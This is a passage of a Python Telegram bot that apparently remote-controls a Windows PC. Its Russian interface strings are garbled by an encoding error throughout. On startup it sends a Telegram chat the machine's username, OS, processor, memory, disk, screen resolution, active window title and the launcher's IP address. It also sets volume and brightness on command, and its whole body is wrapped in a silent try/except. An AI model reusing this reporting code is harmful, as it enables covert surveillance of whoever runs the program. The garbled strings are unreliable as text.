            except: battery = '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
            active_window = getActiveWindowTitle()

            if active_window == None or active_window == '': active_window = '–†–∞–±–æ—á–∏–π —Å—Ç–æ–ª'
            bot.send_message(ACCESS, f'üßê –ö–æ–º–ø—å—é—Ç–µ—Ä –ø–æ–¥–∫–ª—é—á–µ–Ω!\n\n‚è∞ –¢–æ—á–Ω–æ–µ –≤—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: *{startup_time}*\nüíæ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - *{login}*\nü™ë –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ - *{oper[0]} {oper[2]} {oper[3]}*\nüßÆ –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä - *{oper[5]}*\nüòª –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å: *–î–æ—Å—Ç—É–ø–Ω–æ {int(virtual_memory[0] / 1e+9)} –ì–ë | –ó–∞–≥—Ä—É–∂–µ–Ω–æ {virtual_memory[2]}%*\nüîã –ë–∞—Ç–∞—Ä–µ—è –∑–∞—Ä—è–∂–µ–Ω–∞ –Ω–∞ *{battery}*\nüñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞ - *{width}x{height}*\nüìÄ –ü–∞–º—è—Ç—å: ' + '*{:6.2f}* –ì–ë'.format(total_mem/gb) + " –≤—Å–µ–≥–æ, –æ—Å—Ç–∞–ª–æ—Å—å *{:6.2f}* –ì–ë".format(free_mem/gb) + f'\nüîë IP –∞–¥—Ä–µ—Å –∑–∞–ø—É—Å—Ç–∏–≤—à–µ–≥–æ - *{str(ip)[2:-1]}*\n*üñº –ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ - {active_window}*', parse_mode="Markdown")
            return pc_settings(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return pc_settings(message)


    def volume_set(message: types.Message):
        if is_access_denied(message.from_user): return None
        bot.send_message(message.chat.id, f'üîß *–í–≤–µ–¥–∏—Ç–µ —É—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ (0-100)!\n\n–¢–µ–∫—É—â–∏–π —É—Ä–æ–≤–µ–Ω—å - {Sound.current_volume()}*', reply_markup=back_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_volume_set)

    def check_volume_set(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        level = message.text.strip()
        if level  == back_text: return pc_settings(message)
        elif level == '/start': return start(message)
        elif not message.text.strip().isdigit():
            bot.send_message(message.chat.id, f'‚ùå *–£—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º!*', parse_mode='Markdown')
            return pc_settings(message)

        if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'‚ùå *–£—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –±–æ–ª—å—à–µ 0 –∏ –º–µ–Ω—å—à–µ 100!*', parse_mode='Markdown')
            
        Sound.volume_set(int(level))
        bot.send_message(message.chat.id, f'‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ —É—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ *{level}*!', parse_mode='Markdown')
        return pc_settings(message)


    def brightness_set(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, f'üîß *–í–≤–µ–¥–∏—Ç–µ —É—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ (0-100)!\n\n–¢–µ–∫—É—â–∏–π —É—Ä–æ–≤–µ–Ω—å - {get_brightness()}*', reply_markup=back_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_brightness_set)

    def check_brightness_set(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        level = message.text.strip()
        if level  == back_text: return pc_settings(message)
        elif level == '/start': return start(message)
        elif not message.text.strip().isdigit():
            bot.send_message(message.chat.id, f'‚ùå *–£—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º!*', parse_mode='Markdown')
            return pc_settings(message)

        if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'‚ùå *–£—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –±–æ–ª—å—à–µ 0 –∏ –º–µ–Ω—å—à–µ 100!*', parse_mode='Markdown')
            
        set_brightness(int(level))
        bot.send_message(message.chat.id, f'‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ —É—Ä–æ–≤–µ–Ω—å —è—Ä–∫–æ—Å—Ç–∏ *{level}*!', parse_mode='Markdown')
        return pc_settings(message)

    if __name__ == '__main__':
        startup_time = datetime.now()
        message = bot.send_message(ACCESS, f'üßê –ö–æ–º–ø—å—é—Ç–µ—Ä –ø–æ–¥–∫–ª—é—á–µ–Ω!\n\n‚è∞ –¢–æ—á–Ω–æ–µ –≤—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: *{startup_time}*\nüíæ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - *{login}*\nü™ë –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ - *{oper[0]} {oper[2]} {oper[3]}*\nüßÆ –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä - *{oper[5]}*\nüòª –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å: *–î–æ—Å—Ç—É–ø–Ω–æ {int(virtual_memory[0] / 1e+9)} –ì–ë | –ó–∞–≥—Ä—É–∂–µ–Ω–æ {virtual_memory[2]}%*\nüîã –ë–∞—Ç–∞—Ä–µ—è –∑–∞—Ä—è–∂–µ–Ω–∞ –Ω–∞ *{battery}*\nüñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞ - *{width}x{height}*\nüìÄ –ü–∞–º—è—Ç—å: ' + '*{:6.2f}* –ì–ë'.format(total_mem/gb) + " –≤—Å–µ–≥–æ, –æ—Å—Ç–∞–ª–æ—Å—å *{:6.2f}* –ì–ë".format(free_mem/gb) + f'\nüîë IP –∞–¥—Ä–µ—Å –∑–∞–ø—É—Å—Ç–∏–≤—à–µ–≥–æ - *{str(ip)[2:-1]}*', parse_mode="Markdown")
        mainmenu(message)
        bot.infinity_polling(none_stop = True, skip_pending=True)
except:
    pass